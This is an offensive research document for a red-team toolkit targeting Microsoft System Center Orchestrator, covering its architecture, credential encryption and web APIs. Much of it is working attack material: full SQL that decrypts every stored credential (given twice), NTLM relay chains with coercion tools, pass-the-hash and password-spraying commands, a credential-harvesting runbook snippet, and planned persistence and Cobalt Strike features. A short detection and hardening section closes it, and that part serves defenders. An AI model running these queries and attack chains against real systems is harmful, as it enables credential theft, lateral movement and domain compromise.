# System Center Orchestrator (SCORCH) Offensive Research
## Deep Dive for Tooling Development

---

## Executive Summary

System Center Orchestrator (SCORCH) is a workflow management solution in the Microsoft System Center suite. It provides automation capabilities across enterprise environments, connecting to AD, SCOM, SCCM, VMM, Exchange, and more through Integration Packs. This makes it a **high-value credential store**.

**Tool:** [scorch v2.0.1](https://github.com/professor-moody/scorch) - Go-based offensive toolkit for SCORCH.

**Key Attack Value:**
- Stores credentials for numerous enterprise systems (AD, VMM, SCOM, SCCM, Exchange, Azure)
- SQL Server database with encrypted credentials (similar patterns to SCOM)
- REST/OData API for remote interaction
- Service accounts typically run with elevated privileges
- Microsoft support extended to 2035 (System Center 2025)

---

## Architecture Overview

### Core Components

| Component | Purpose | Port/Protocol | Attack Surface |
|-----------|---------|---------------|----------------|
| **Orchestration Database** | Central data store (SQL Server) | TCP 1433 | Credential extraction, ORCHESTRATOR_SYM_KEY |
| **Management Server** | Communication layer between Designer and DB | N/A | Single point of control |
| **Runbook Server(s)** | Execute runbooks, communicate with DB | N/A | Service account, local credential cache |
| **Web Service** | OData REST API | TCP 81 (default) | Remote enumeration, runbook execution |
| **Web Console** | HTML5 UI (formerly Silverlight) | TCP 82 (default) | Session hijacking, API abuse |
| **Runbook Designer** | Build/edit runbooks | N/A | Local tool, settings extraction |

### Key File Locations

```
# Database Connection Settings (encrypted)
C:\Program Files (x86)\Microsoft System Center\Orchestrator\Management Server\Settings.dat

# Web Service Configuration
C:\Program Files (x86)\Microsoft System Center\Orchestrator\Web Service\Orchestrator\Web.config

# Runbook Server Logs
%ProgramData%\Microsoft System Center 2012\Orchestrator\RunbookService.exe\Logs\

# API Swagger/OpenAPI Spec (SCORCH 2022+)
{install_dir}\assets\Orchestrator.WebAPI-22.1.0.json
```

### Windows Services

| Service Name | Display Name | Account | Purpose |
|--------------|--------------|---------|---------|
| `orunbook` | Orchestrator Runbook Service | Domain service account | Executes runbooks |
| `omanagement` | Orchestrator Management Service | Domain service account | Manages runbook distribution |

### SQL Database Roles

| Role | Purpose |
|------|---------|
| `Microsoft.SystemCenter.Orchestrator.Operators` | Read access |
| `Microsoft.SystemCenter.Orchestrator.Runtime` | Runbook execution |
| `Microsoft.SystemCenter.Orchestrator.Admins` | Full administrative access |

---

## Credential Storage Analysis

### Encryption Architecture

SCORCH uses **SQL Server native encryption** with asymmetric/symmetric key pairs:

```sql
-- Key hierarchy
ORCHESTRATOR_ASYM_KEY    -- Asymmetric key (protects symmetric key)
ORCHESTRATOR_SYM_KEY     -- Symmetric key (encrypts actual data)
SQL Server Master Key    -- Protects database encryption hierarchy
Service Master Key       -- Protects SQL Server Master Key
```

### Encrypted Data Locations

#### 1. Global Variables (VARIABLES table)
```sql
-- Encrypted variables use format: `d.T.~De/[hex_data]`d.T.~De/
-- Example encrypted value:
-- `d.T.~De/00F04DA615688A4C96C2891105226AE90100000059A187C285E8AC6C...`d.T.~De/
```

#### 2. Integration Pack Connections (stored credentials)
- SCOM connections
- VMM connections
- SCCM connections
- AD connections
- Exchange connections
- Custom IP connections

#### 3. Runbook Activity Credentials
- Run As accounts embedded in activities
- Database query credentials
- Remote execution credentials

### Decryption Process (From Fox-IT Research)

```sql
-- Step 1: Open symmetric key using asymmetric key
USE Orchestrator;
OPEN SYMMETRIC KEY ORCHESTRATOR_SYM_KEY 
    DECRYPTION BY ASYMMETRIC KEY ORCHESTRATOR_ASYM_KEY;

-- Step 2: Extract and decrypt variables
SELECT 
    Act.Name,
    v.Value AS Encrypted,
    CASE 
        WHEN v.Value LIKE '`d.%' 
        THEN CONVERT(NVARCHAR, DECRYPTBYKEY(
            CONVERT(VARBINARY(MAX), 
                SUBSTRING(v.Value, 
                    CHARINDEX('/', v.Value) + 1, 
                    LEN(v.Value) - (2 * CHARINDEX('/', v.Value))
                ), 2)
            ))
        ELSE v.Value 
    END AS Decrypted,
    Act.UniqueID
FROM [Orchestrator].[dbo].[VARIABLES] v
INNER JOIN [Orchestrator].[dbo].[OBJECTS] AS Act 
    ON Act.UniqueID = v.UniqueID
WHERE Act.Deleted = 0;

-- Step 3: Close symmetric key
CLOSE SYMMETRIC KEY ORCHESTRATOR_SYM_KEY;
```

### Key Database Tables

| Table | Purpose | Sensitive Data |
|-------|---------|----------------|
| `VARIABLES` | Global variables | Encrypted passwords, API keys |
| `OBJECTS` | All objects (activities, folders) | Object metadata |
| `POLICIES` | Runbook definitions | Credential references |
| `POLICYINSTANCES` | Running/completed jobs | Execution history |
| `FOLDERS` | Folder structure | Organization info |
| `TASK_QUERYDATABASE` | Database query activities | Connection strings, passwords |
| `Microsoft.SystemCenter.Orchestrator.Internal.AuthorizationCache` | Permission cache | Access control bypass |

---

## API Interaction

### Legacy OData API (Pre-2022)

**Base URL:** `http://<server>:81/Orchestrator2012/Orchestrator.svc/`

```
# Available Collections (GET)
/Runbooks                    - List all runbooks
/Runbooks(guid'<id>')       - Get specific runbook
/Runbooks(guid'<id>')/Parameters  - Get runbook parameters
/Jobs                        - List all jobs
/Jobs(guid'<id>')           - Get specific job
/Folders                     - List folders
/Activities                  - List activities
/RunbookServers             - List runbook servers
/Events                      - List events
/Statistics                  - Execution statistics
```

**Starting a Runbook (POST):**
```xml
POST http://<server>:81/Orchestrator2012/Orchestrator.svc/Jobs
Content-Type: application/atom+xml

<?xml version="1.0" encoding="utf-8"?>
<entry xmlns:d="http://schemas.microsoft.com/ado/2007/08/dataservices" 
       xmlns:m="http://schemas.microsoft.com/ado/2007/08/dataservices/metadata" 
       xmlns="http://www.w3.org/2005/Atom">
  <content type="application/xml">
    <m:properties>
      <d:RunbookId type="Edm.Guid">{RUNBOOK-GUID}</d:RunbookId>
      <d:Parameters>
        <![CDATA[<Data><Parameter><ID>{PARAM-GUID}</ID><Value>value</Value></Parameter></Data>]]>
      </d:Parameters>
    </m:properties>
  </content>
</entry>
```

### Modern JSON API (2022+)

**Base URL:** `http://<server>:81/api/`

```
# Endpoints
GET  /api/runbooks           - List runbooks
GET  /api/runbooks/{id}      - Get runbook details
POST /api/Jobs               - Create new job
GET  /api/Jobs               - List jobs
GET  /api/Jobs/{id}          - Get job status
GET  /api/login              - Test authentication
```

**Starting a Runbook (JSON):**
```json
POST http://<server>:81/api/Jobs
Content-Type: application/json

{
    "RunbookId": "0E3D0830-5BB6-4717-BB94-330E0338F153",
    "RunbookServers": ["server1"],
    "Parameters": [
        {"Name": "Param1", "Value": "value1"},
        {"Name": "Param2", "Value": "value2"}
    ],
    "CreatedBy": null
}
```

### Authentication

- **Windows Authentication** (default) - NTLM/Kerberos
- **Basic Authentication** (optional, must be enabled)
- API uses IIS authentication
- Permissions controlled via Orchestrator Users Group

---

## Vulnerability Assessment Framework

### Authentication & Access Control Vulnerabilities

| ID | Vulnerability | Severity | Impact | Detection Method |
|----|--------------|----------|--------|------------------|
| SCORCH-001 | Anonymous API Access | CRITICAL | Full runbook enumeration, potential execution | Unauthenticated GET to `/api/runbooks` returns 200 |
| SCORCH-007 | Missing EPA | HIGH | NTLM relay to other services | Check IIS auth settings, no EPA in NTLM exchange |
| SCORCH-008 | NTLM Relayable | HIGH | Credential relay to LDAP/SMB/ADCS | HTTP + NTLM without channel binding |
| SCORCH-010 | Default Credentials | MEDIUM | Unauthorized access | Test common service account patterns |
| SCORCH-018 | Auth Cache Bypass | MEDIUM | Stale permissions used | AuthorizationCache table manipulation |

### Configuration Vulnerabilities

| ID | Vulnerability | Severity | Impact | Detection Method |
|----|--------------|----------|--------|------------------|
| SCORCH-002 | HTTP Cleartext | HIGH | Credential interception | Connect on port 81, check for TLS |
| SCORCH-003 | Self-Signed Cert | MEDIUM | MITM attacks | TLS handshake with untrusted cert |
| SCORCH-004 | Swagger Exposed | LOW | API discovery aid | GET `/swagger` returns 200 |
| SCORCH-005 | Verbose Errors | MEDIUM | Information disclosure | Trigger errors, check for stack traces |
| SCORCH-009 | CORS Misconfiguration | MEDIUM | Cross-origin credential theft | OPTIONS with evil origin returns allow |
| SCORCH-020 | Audit Logging Disabled | LOW | No forensic trail | Check SQL audit configuration |

### Credential Exposure Vulnerabilities

| ID | Vulnerability | Severity | Impact | Detection Method |
|----|--------------|----------|--------|------------------|
| SCORCH-011 | Sensitive Data in Variables | HIGH | Credential harvest | Query VARIABLES table for encrypted values |
| SCORCH-013 | Job Output Leakage | MEDIUM | Credential in logs | Scan job outputs for sensitive patterns |
| SCORCH-015 | Hardcoded Creds in Runbooks | HIGH | Credential extraction | Analyze runbook activities for credentials |
| SCORCH-016 | Unencrypted DB Connection | HIGH | Credential interception | Check SQL TLS configuration |
| SCORCH-017 | Weak Encryption Keys | MEDIUM | Key recovery | Analyze SQL key management |
| SCORCH-019 | Service Account Overpriv | CRITICAL | Domain compromise | Check service account group memberships |

### NTLM Relay Attack Conditions

For NTLM relay to be viable against SCORCH, the following conditions must exist:

**Required Conditions:**
1. **HTTP Used** - No TLS means no channel binding tokens possible
2. **EPA Not Configured** - IIS Extended Protection disabled (this is the default)
3. **NTLM Enabled** - Negotiate/NTLM present in WWW-Authenticate header
4. **Relay Target Available** - LDAP/ADCS/SMB accepting relay without signing

**Attack Flow:**
```
1. Position as MITM (ARP spoof, WPAD, DNS hijack, or auth coercion)
2. User/service authenticates to SCORCH via browser or API call
3. Capture NTLM Type 1/2/3 messages in transit
4. Relay captured auth to target (e.g., LDAP on DC, ADCS web enrollment)
5. Perform privileged action (create machine account, request cert, modify ACL)
6. Escalate to Domain Admin via obtained access
```

**Authentication Coercion Vectors in SCORCH:**
- WebDAV UNC path in runbook parameter triggers SMB auth
- URL reference in .NET Script activity can trigger HTTP auth
- External resource in Run Program activity
- Runbook that accesses attacker-controlled share

---

## Attack Vectors

### 1. Local Credential Extraction (Post-Compromise)

**Prerequisites:** Local admin on SCORCH server OR database access

**Targets:**
- Settings.dat file (DPAPI encrypted database connection)
- Web.config (encrypted connection strings)
- SQL Database (encrypted variables and credentials)

**Tools to Develop:**
- Settings.dat decryptor (DPAPI)
- Web.config extraction/decryption
- SQL credential dumper (ORCHESTRATOR_SYM_KEY)

### 2. Remote API Enumeration

**Prerequisites:** Domain user with Orchestrator access

**Capabilities:**
- Enumerate runbooks and folders
- Discover Integration Pack connections
- Map enterprise infrastructure through runbook analysis
- Identify service accounts and target systems

### 3. Malicious Runbook Injection

**Prerequisites:** Orchestrator Operators or higher

**Attack Patterns:**
- Create runbook that exfiltrates credentials
- Modify existing runbook to include backdoor
- Execute arbitrary PowerShell/commands
- Pivot to connected systems (SCOM, VMM, SCCM, AD)

### 4. Service Account Abuse

**SCORCH Service Account Typically Has:**
- SQL Server access (db_owner or Microsoft.SystemCenter.Orchestrator.Runtime)
- Local administrator on runbook servers
- Orchestrator System Group membership
- Potentially Domain Admin or equivalent for automation tasks

### 5. Integration Pack Credential Harvesting

**Common High-Value Connections:**
- Active Directory (domain admin credentials)
- SCOM (monitoring admin)
- VMM (hypervisor admin)
- SCCM (deployment admin)
- Exchange (mail admin)
- Azure (cloud admin)
- Custom REST APIs (API keys)

---

## Discovery & Enumeration

### Network Discovery

```
# Default Ports
TCP 81  - Web Service (OData/REST API)
TCP 82  - Web Console
TCP 1433 - SQL Server (Database)

# Service SPN Pattern (if registered)
HTTP/<scorch-server>
HTTP/<scorch-server>.<domain>
```

### LDAP Enumeration

```ldap
# Service Accounts (search for Orchestrator-related)
(&(objectClass=user)(|(name=*orch*)(name=*scorch*)(name=*runbook*)))

# Computer Objects
(&(objectClass=computer)(|(name=*orch*)(name=*scorch*)))
```

### Active Directory

```powershell
# Find Orchestrator Users Group Members
Get-ADGroupMember "Orchestrator Users" -Recursive
Get-ADGroupMember "Orchestrator System Group" -Recursive
Get-ADGroupMember "Orchestrator Admins" -Recursive
```

### SQL Server

```sql
-- Find Orchestrator Database
SELECT name FROM sys.databases WHERE name LIKE '%Orchestrator%'

-- Check for SCORCH encryption keys
SELECT * FROM sys.symmetric_keys WHERE name = 'ORCHESTRATOR_SYM_KEY'
SELECT * FROM sys.asymmetric_keys WHERE name = 'ORCHESTRATOR_ASYM_KEY'
```

---

## Go Toolkit Architecture

### Current Structure (v2.0.1)

```
scorch/
├── cmd/scorch/
│   ├── main.go           # Entry point, command routing, flag parsing
│   ├── assess.go         # Security assessment (anon access, NTLM, TLS)
│   ├── enum.go           # API enumeration (runbooks, servers, folders)
│   ├── exec.go           # Runbook execution with parameters
│   ├── dump.go           # SQL credential extraction (with IP filtering)
│   ├── spray.go          # Password spraying against web service
│   ├── discover.go       # Port scanning, LDAP, SPN discovery
│   ├── client.go         # HTTP client with auth wrappers
│   └── ntlm.go           # Cross-platform NTLM implementation
├── internal/
│   └── auth/
│       └── kerberos.go   # Kerberos authentication (gokrb5)
├── dist/                 # Compiled binaries (Windows/Linux x64/ARM)
├── go.mod
├── go.sum
├── README.md
└── research.md           # This file
```

### Implemented Commands

| Command | Description | Key Features |
|---------|-------------|--------------|
| `assess` | Security assessment | Anonymous access, NTLM relay detection, TLS analysis |
| `enum` | API enumeration | Runbooks, servers, folders, jobs, leak scanning |
| `exec` | Runbook execution | Parameter passing, job monitoring, wait mode |
| `dump` | Credential extraction | SQL decryption, IP filtering (`-ip SCOM`), masking |
| `spray` | Password spraying | User/password lists, concurrency, result logging |
| `discover` | Network discovery | Port scan, LDAP enumeration, SPN discovery |

### Authentication Support

| Method | Flag | Implementation |
|--------|------|----------------|
| Anonymous | (none) | No auth headers |
| Basic Auth | `-u`, `-p` | HTTP Basic |
| NTLM | `-d`, `-u`, `-p` | Cross-platform go-ntlmssp |
| Pass-the-Hash | `-d`, `-u`, `-H` | NTLM with hash |
| Kerberos (password) | `-kerberos`, `-u`, `-p` | gokrb5 |
| Kerberos (ccache) | `-kerberos`, `-ccache` | Ticket cache |
| Kerberos (keytab) | `-kerberos`, `-keytab` | Service keytab |

### Core Dependencies

```go
// go.mod (current)
module scorch-tools

go 1.21

require (
    github.com/microsoft/go-mssqldb v1.7.2   // SQL Server driver (migrated from denisenkom)
    github.com/jcmturner/gokrb5/v8 v8.4.4    // Kerberos auth
    github.com/go-ldap/ldap/v3 v3.4.6        // LDAP queries
    golang.org/x/crypto v0.17.0              // Cryptographic functions
)
```

---

## Implementation Status

### ✅ Completed (v2.0.1)

| Feature | Command | Status |
|---------|---------|--------|
| API client with NTLM/Kerberos auth | All | ✅ Complete |
| Runbook enumeration | `enum` | ✅ Complete |
| Runbook server enumeration | `enum` | ✅ Complete |
| Job history analysis | `enum` | ✅ Complete |
| SQL database credential extraction | `dump` | ✅ Complete |
| ORCHESTRATOR_SYM_KEY decryption | `dump` | ✅ Complete |
| Integration Pack filtering | `dump` | ✅ Complete (`-ip-summary`, `-ip TYPE`) |
| Port scanning | `discover` | ✅ Complete |
| LDAP/SPN discovery | `discover` | ✅ Complete |
| Security assessment | `assess` | ✅ Complete |
| Password spraying | `spray` | ✅ Complete |
| Runbook execution | `exec` | ✅ Complete |

### 🔄 In Progress (dev branch)

| Feature | Priority | Notes |
|---------|----------|-------|
| Enhanced LDAP filters | P2 | gMSA, naming conventions |
| OIS export file parser | P1 | Offline encrypted variable extraction |

### 📋 Planned

| Feature | Priority | Notes |
|---------|----------|-------|
| Local triage command | P1 | Registry, services, config files (Windows) |
| DPAPI decryption | P3 | Settings.dat, local credential cache |
| Runbook modification via SQL | P3 | Persistence mechanism |
| SCOM credential extraction | P4 | Leverage SCORCH→SCOM connections |
| BOF implementations | P4 | Cobalt Strike integration |

---

## Vulnerability Enumeration

### Authentication Weaknesses

| ID | Finding | Severity | Description |
|----|---------|----------|-------------|
| SCORCH-AUTH-001 | NTLM Without EPA | HIGH | NTLM authentication without Extended Protection allows relay attacks |
| SCORCH-AUTH-002 | Negotiate Fallback | MEDIUM | Negotiate may fall back to NTLM if Kerberos fails |
| SCORCH-AUTH-003 | Basic Auth Over HTTP | HIGH | Basic authentication sends credentials in base64 (cleartext) |
| SCORCH-ANON-001 | Anonymous Access | CRITICAL | API endpoints accessible without authentication |

### NTLM Relay Attack Surface

**Conditions for Relay:**
1. NTLM authentication enabled on IIS
2. HTTP (not HTTPS) or HTTPS without EPA
3. No SMB/LDAP signing enforcement
4. Attacker in MITM position

**Attack Flow:**
```
1. Attacker -> SCORCH: Initiate connection, receive NTLM challenge
2. Attacker -> Victim: Coerce authentication (SpoolSample, PetitPotam, etc.)
3. Victim -> Attacker: NTLM Type 1 message
4. Attacker -> SCORCH: Forward Type 1
5. SCORCH -> Attacker: NTLM Type 2 (challenge)
6. Attacker -> Victim: Forward Type 2
7. Victim -> Attacker: NTLM Type 3 (response)
8. Attacker -> SCORCH: Forward Type 3, authenticate as victim
```

**Relay Targets from SCORCH:**
- LDAP/LDAPS (if SMB signing not enforced)
- Other IIS applications
- SQL Server (if extended protection disabled)
- AD CS Web Enrollment (ESC8)

### Configuration Vulnerabilities

| ID | Finding | Severity | Description |
|----|---------|----------|-------------|
| SCORCH-TLS-001 | HTTP Access | HIGH | Web service accessible over unencrypted HTTP |
| SCORCH-TLS-002 | Weak TLS | MEDIUM | TLS 1.0/1.1 enabled (deprecated) |
| SCORCH-CORS-001 | Permissive CORS | MEDIUM | CORS allows arbitrary origins |
| SCORCH-CORS-002 | Credentials + Wildcard | HIGH | CORS allows credentials with wildcard origin |
| SCORCH-INFO-001 | Version Disclosure | LOW | Server/ASP.NET version in headers |

### Permission Issues

**DCOM Security:**
- `omanagement` DCOM object requires proper ACL configuration
- Default: Orchestrator Users Group has access
- Misconfiguration: Local Administrators group used (privilege escalation path)

**Database Roles:**
- `Microsoft.SystemCenter.Orchestrator.Operators` - Read access
- `Microsoft.SystemCenter.Orchestrator.Runtime` - Execution access (can decrypt!)
- `Microsoft.SystemCenter.Orchestrator.Admins` - Full administrative access

**Authorization Cache Bypass:**
```sql
-- Permissions cached in database, may be stale
TRUNCATE TABLE [Microsoft.SystemCenter.Orchestrator.Internal].AuthorizationCache
```

### Credential Exposure Vectors

1. **Global Variables Export Bug:** ALL encrypted variables exported with ANY runbook export
2. **Job Logs:** Credentials may leak in activity logs
3. **Runbook Parameters:** Password parameters stored in job history
4. **Integration Pack Connections:** Credentials stored in database, accessible via Runbook Designer
5. **Web.config:** Connection strings may contain SQL credentials
6. **Settings.dat:** DPAPI-encrypted database connection information

---

## Attack Scenarios

### Scenario 1: Unauthenticated Enumeration → Credential Theft

```bash
# 1. Check for anonymous access
scorch assess -t scorch.corp.local

# 2. If anonymous access found, enumerate runbooks
scorch enum -t scorch.corp.local -all -json

# 3. Search for credential-handling runbooks
scorch enum -t scorch.corp.local -leaks

# 4. Analyze runbook parameters for credential inputs
scorch enum -t scorch.corp.local -runbooks -json
```

### Scenario 2: Domain User → SCORCH Admin via NTLM Relay

```bash
# 1. Assess for NTLM relay vulnerability
scorch assess -t scorch.corp.local

# 2. Set up NTLM relay to SCORCH (if EPA disabled)
ntlmrelayx.py -t http://scorch.corp.local:81/Orchestrator2012/Orchestrator.svc/Runbooks

# 3. Coerce authentication from high-privilege user
# (SpoolSample, PetitPotam, etc.)

# 4. Relay creates authenticated session
# 5. Execute malicious runbook or extract credentials
```

### Scenario 3: SQL Access → Full Credential Dump

```bash
# 1. Connect to SQL Server (compromised SA or trusted auth)
scorch dump -t sqlserver.corp.local -db Orchestrator -info

# 2. Get Integration Pack summary
scorch dump -t sqlserver.corp.local -ip-summary

# 3. Extract and decrypt all credentials
scorch dump -t sqlserver.corp.local -all -decrypt -sensitive

# 4. Extract specific IP type (e.g., SCOM connections)
scorch dump -t sqlserver.corp.local -ip SCOM -decrypt -sensitive

# 5. Use extracted credentials for lateral movement
# SCOM admin → SCOM infrastructure
# VMM admin → Hypervisor infrastructure
# SCCM admin → Endpoint management
```

### Scenario 4: Pass-the-Hash to SCORCH

```bash
# 1. Extract NTLM hash from compromised system
# (Mimikatz, secretsdump, etc.)

# 2. Use hash to authenticate to SCORCH API
scorch enum -t scorch.corp.local -d CORP -u admin \
    -H aad3b435b51404eeaad3b435b51404ee -all

# 3. Execute privileged runbooks
scorch exec -t scorch.corp.local -d CORP -u admin \
    -H aad3b435b51404eeaad3b435b51404ee \
    -runbook <name-or-guid> -wait
```

### Scenario 5: Malicious Runbook Injection

```powershell
# If Runbook Designer access obtained:
# 1. Create credential harvester runbook
# 2. Use "Run .NET Script" activity with:
$creds = @()
$vars = Get-SCOVariable | Where-Object { $_.Encrypted }
foreach ($v in $vars) {
    $creds += [PSCustomObject]@{
        Name = $v.Name
        Value = $v.Value  # Auto-decrypted in .NET Script context
    }
}
# Exfiltrate $creds

# 3. Schedule runbook for persistence
# 4. Trigger via API or schedule
```

---

## Detection & Hunting

### Event Log Sources

| Log | Event ID | Description |
|-----|----------|-------------|
| Security | 4624 | Logon events to SCORCH servers |
| Security | 4625 | Failed logon attempts |
| Security | 4648 | Explicit credential logon |
| Application | 1000+ | Orchestrator-specific events |
| IIS Logs | - | Web service access patterns |

### Indicators of Compromise

**Suspicious API Activity:**
- High volume of `/Runbooks` enumeration requests
- Requests to `/$metadata` from unexpected sources
- Job creation from unusual IP addresses
- Requests with NTLM authentication from non-standard clients

**Database Queries:**
```sql
-- Detect credential extraction attempts
SELECT * FROM sys.dm_exec_query_stats qs
CROSS APPLY sys.dm_exec_sql_text(qs.sql_handle) qt
WHERE qt.text LIKE '%ORCHESTRATOR_SYM_KEY%'
   OR qt.text LIKE '%DECRYPTBYKEY%'
   OR qt.text LIKE '%VARIABLES%' AND qt.text LIKE '%Value%'
```

**File System:**
- Suspicious access to `Settings.dat`
- Modification of `Web.config`
- Export files (`.ois_export`) in unexpected locations

### Hardening Recommendations

1. **Enable HTTPS with TLS 1.2+** on all SCORCH web services
2. **Enable Extended Protection for Authentication (EPA)** in IIS
3. **Disable NTLM**, use Kerberos-only where possible
4. **Implement LDAP signing and channel binding**
5. **Restrict database access** - use specific SQL roles, not sysadmin
6. **Audit runbook permissions** - principle of least privilege
7. **Monitor API access** - alert on enumeration patterns
8. **Secure Integration Pack credentials** - use managed service accounts
9. **Encrypt backups** - runbook exports contain credentials
10. **Network segmentation** - isolate SCORCH from general network

---

## References

- Fox-IT Orchestrator Decryption Tool: https://github.com/fox-it/Decrypt-OrchestratorSecretVariables
- Microsoft SCORCH Documentation: https://learn.microsoft.com/en-us/system-center/orchestrator/
- SCORCH API Community Module: https://github.com/WillyMoselhy/SystemCenterOrchestrator
- System Center 2025 Overview: https://learn.microsoft.com/en-us/system-center/orchestrator/learn-about-orchestrator
- SpecterOps SCOM Research: https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-1/
- MITRE ATT&CK T1557: https://attack.mitre.org/techniques/T1557/
- KB5005413 NTLM Relay Mitigations: https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks

---

## Quick Reference: Decryption SQL

```sql
-- Complete credential extraction query
USE Orchestrator;
GO

OPEN SYMMETRIC KEY ORCHESTRATOR_SYM_KEY 
    DECRYPTION BY ASYMMETRIC KEY ORCHESTRATOR_ASYM_KEY;

-- Extract all encrypted variables with folder path
WITH RunbookPath AS (
    SELECT 'Variables\' + CAST(name AS VARCHAR(MAX)) AS [path], uniqueid
    FROM dbo.folders b
    WHERE b.ParentID='00000000-0000-0000-0000-000000000005' 
        AND disabled = 0 AND deleted = 0
    UNION ALL
    SELECT CAST(c.[path] + '\' + CAST(b.name AS VARCHAR(MAX)) AS VARCHAR(MAX)), b.uniqueid
    FROM dbo.FOLDERS b
    INNER JOIN RunbookPath c ON b.ParentID = c.UniqueID
    WHERE b.Disabled = 0 AND b.Deleted = 0
)
SELECT 
    rp.[path],
    o.Name AS VariableName,
    v.Value AS EncryptedValue,
    CASE 
        WHEN v.Value LIKE '`d.%' 
        THEN CONVERT(NVARCHAR(MAX), DECRYPTBYKEY(
            CONVERT(VARBINARY(MAX), 
                SUBSTRING(v.Value, CHARINDEX('/', v.Value) + 1, 
                    LEN(v.Value) - (2 * CHARINDEX('/', v.Value))), 2)))
        ELSE v.Value 
    END AS DecryptedValue
FROM [dbo].[VARIABLES] v
INNER JOIN [dbo].[OBJECTS] o ON o.UniqueID = v.UniqueID
LEFT JOIN RunbookPath rp ON o.ParentID = rp.UniqueID
WHERE o.Deleted = 0;

CLOSE SYMMETRIC KEY ORCHESTRATOR_SYM_KEY;
GO
```